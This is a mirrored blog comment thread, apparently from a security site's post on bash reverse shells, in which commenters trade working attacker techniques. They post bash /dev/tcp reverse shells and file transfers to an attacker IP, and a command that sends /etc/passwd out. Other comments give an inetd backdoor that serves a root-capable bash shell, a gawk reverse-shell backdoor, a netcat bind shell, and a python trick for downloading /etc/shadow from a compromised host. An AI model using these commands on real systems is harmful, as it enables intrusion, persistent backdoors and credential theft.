+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120586">
+			May 3, 2008 at 1:15 pm</a>		</div>
+
+		<p>unfortunately batch is very limited but you can do similar things with WScript combined with JavaScript(JScript) or VBScript. These stuff come by default on every Windows operating system.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-120587">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120587">
+			May 3, 2008 at 2:28 pm</a>		</div>
+
+		<p>pdp</p>
+<p>thanks for pointing me in the right direction ;-) Mr. Google sez: <a href="http://www.codeproject.com/KB/cs/ReverseRAT.aspx" rel="nofollow">http://www.codeproject.com/KB/cs/ReverseRAT.aspx</a></p>
+<p>LOL<br />
+Awesome!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-120875">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120875">
+			May 6, 2008 at 12:45 am</a>		</div>
+
+		<p>Fun and games with <code>/dev/tcp</code> and file transfer: Ok here is how to use this bash <code>/dev/tcp</code> trick to move a file.</p>
+<ol>
+<li>On attacker&#8217;s box: I want to move a file named test.txt to the victim box
+<pre><code>cat test.txt | nc -l 3333</code></pre>
+</li>
+<li>I&#8217;ll then connect out from victim to attacker&#8217;s port 3333 and pull back the file <code>test.txt</code>
+<pre><code>bash -i &gt;&amp; /dev/tcp/attackersIP/8080 0&gt;&amp;1 &gt; test.txt</code></pre>
+</li>
+</ol>
+<p>Advantages: netcat stays on the attacker&#8217;s box. All I use on the victim box is what&#8217;s already there&#8230;bash ;-)</p>
+<p>&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;</p>
+<p>ok so you are probably saying &#8220;That&#8217;s nice&#8221; but if I&#8217;m already on the victim and I want to say transfer /etc/password or /etc/shadow back to my attacker&#8217;s box and I&#8217;m too lazy to do terminal copy and paste&#8230;then what?</p>
+<ol>
+<li>on attacker&#8217;s box do
+<pre><code>nc -l -p 8080 -vvv &gt; passwd</code></pre>
+</li>
+<li>on victim box do
+<pre><code>cat /etc/passwd &gt; /dev/tcp/attackerIP/8080</code></pre>
+</li>
+</ol>
+<p>and like magic the victim&#8217;s /etc/password is transferred to the attacker&#8217;s box.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-120921">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120921">
+			May 6, 2008 at 10:36 am</a>		</div>
+
+		<p>Transfer a file using HTTP: Say you have compromised a victim box and want to transfer a file to the victim. </p>
+<p>1. Put the file in the web root of the attacker box (I&#8217;m thinking of the web server in backtrack.<br />
+2. Start up the web server on the attacker box<br />
+3. On the victim box do:</p>
+<pre><code>(echo -e "GET /filename_you_are_moving HTTP/0.9\r\n\r\n" \
+1&gt;&amp;3 &amp; cat 0&lt;&amp;3) 3 /dev/tcp/AttackerIP/80 \
+| (read i; while [ "$(echo $i | tr -d '\r')" != "" ]; \
+do read i; done; cat) &gt; local_filename</code></pre>
+<p>Credit where credit is due:<br />
+<a href="http://www.pebble.org.uk/linux/bashbrowser" rel="nofollow">http://www.pebble.org.uk/linux/bashbrowser</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-121307">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2b126676a67d146691c4d3b0de4c8db0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-121307">
+			May 9, 2008 at 8:44 pm</a>		</div>
+
+		<p>Here is an important thing I just realized&#8230;d&#8217;oh this /dev/tcp/ thing can only connect outbound, it cannot listen and receive a connection like netcat. As far as I can tell ;-)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-122233">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122233">
+			May 24, 2008 at 2:05 pm</a>		</div>
+
+		<p>BTW the /dev/tcp and /dev/udp is also a feature of the Korn shell. Korn shell is robust shell favored by *nix oldskoolers. You will find it installed by default on Mac OS X. I don&#8217;t believe it comes default on the remainder of the BSDs(free and open). As far as I can tell it works pretty much the way it does under Bash.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-122254">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122254">
+			May 25, 2008 at 8:15 pm</a>		</div>
+
+		<p>Ok here&#8217;s some old skool stuff. To create a listener on a *nix box running inetd (as apposed to xinetd)</p>
+<ul>
+<li>Pick an obscure service from <code>/etc/services</code> associated with a tcp port 1024 and above&#8230;for example laplink
+<pre><code>laplink         1547/tcp     # laplink</code></pre>
+</li>
+<li>Add the following line to <code>/etc/inetd.conf</code>
+<pre><code>laplink    stream  tcp     nowait  /bin/bash bash -i</code></pre>
+</li>
+<li>restart <code>inetd.conf</code>
+<pre><code>killall -HUP inetd</code></pre>
+</li>
+</ul>
+<p><strong>Explaination:</strong> You are creating a listener on port tcp/1547 that will shovel you a bash shell.</p>
+<p><strong>Caveat:</strong> this obviously is not my *idea* It&#8217;s just very VERY old stuff that still works.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-122387">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122387">
+			May 30, 2008 at 11:52 pm</a>		</div>
+
+		<p>Ok I know I know I&#8217;m obsessive ;-) Here is a reverse shell implemented in gawk</p>
+<p>Credit: Phrack 62</p>
+<pre><code>#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd&gt; "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |&amp; Service
+                        Service |&amp; getline cmd
+                        if (cmd) {
+                                while ((cmd |&amp; getline) &gt; 0)
+                                        print $0 |&amp; Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-122404">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122404">
+			June 1, 2008 at 5:34 pm</a>		</div>
+
+		<p>Yes exact citation for above is p62-0x08_Remote_Exec.txt &#8220;FIST! FIST! FIST! Its all in the wrist: Remote Exec&#8221; by grugg</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-122405">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122405">
+			June 1, 2008 at 5:37 pm</a>		</div>
+
+		<p>Python Trick</p>
+<p>If you can use a web app to execute shell commands on the victim:</p>
+<pre><code>cd / &amp;&amp; python -m SimpleHTTPServer</code></pre>
+<p>then</p>
+<p>Python will start it&#8217;s own web server listening on port 8000. You can surf to the victim on that port: <code><a href="http://victim:8000/" rel="nofollow">http://victim:8000</a></code> and then transverse the entire file system and download <code>/etc/passwd</code> and <code>/etc/shadow</code>.</p>
+<p>Tested on macos x 10.5.3 and Safari 3.1.1. For other *nix variants, your mileage may vary.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123738">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f5ccc3e8b23493df26861d148cd93815?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">edward baddouh</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123738">
+			September 16, 2008 at 11:46 pm</a>		</div>
+
+		<p>nice work pdp, keep on going!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-124301">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6553298663f3ce100c6163e6f926980b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.delirandom.net/' rel='external nofollow' class='url'>vecna</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-124301">
+			November 10, 2008 at 9:53 am</a>		</div>
+
+		<p><a href="http://www.delirandom.net/20080323/ping-is-the-most-deployed-backdoor-on-the-net-omg/" rel="nofollow">http://www.delirandom.net/2008.....e-net-omg/</a> the same prerequisite, but traffic is encoded in icmp.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-124302">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-124302">
+			November 10, 2008 at 9:58 am</a>		</div>
+
+		<p>this is quite interesting. thanks for sharing.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-127498">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/405305d505e5f3191e29a5db057fbcdf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jeff Price</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127498">
+			June 17, 2009 at 6:58 pm</a>		</div>
+
+		<p>2 way /dev/tcp communication on debian. Use netcat</p>
+<pre><code>mkfifo mypipe
+cat mypipe|/bin/bash|nc -l -p 6000 &gt;mypipe</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-127536">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127536">
+			June 25, 2009 at 1:19 pm</a>		</div>
+
+		<p>@Jeff: awesome. just tested it on my ubuntu workstation and works like a charm. thanks for sharing!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-128472">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3158cf408532b750f5ba4783447d0b83?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">revtan</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128472">
+			April 7, 2010 at 2:43 am</a>		</div>
+
+		<p>thanks for nice article&#8230;</p>
+<pre><code>(macubergeek == pdp)  ? ;-P : ;-|</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-129143">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.pdp.io/' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129143">
+			September 26, 2010 at 9:11 pm</a>		</div>
+
+		<p>not really! :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-129730">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/42aafcdfd5d741de9b581d215c696c91?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Guy</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129730">
+			February 18, 2011 at 11:03 am</a>		</div>
+
+		<p>I doubt whether this can be correct. </p>
+<p>The man page of nc mentions this w.r.t. to the <code>-l</code> option&#8221;: &#8220;It is an error to use this <code>[l-]</code> option in conjunction with the <code>-p</code>, <code>-s</code>, or <code>-z</code> options.&#8221;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="813"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c790f0656c" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/reverse-shell-with-bash/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:49:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
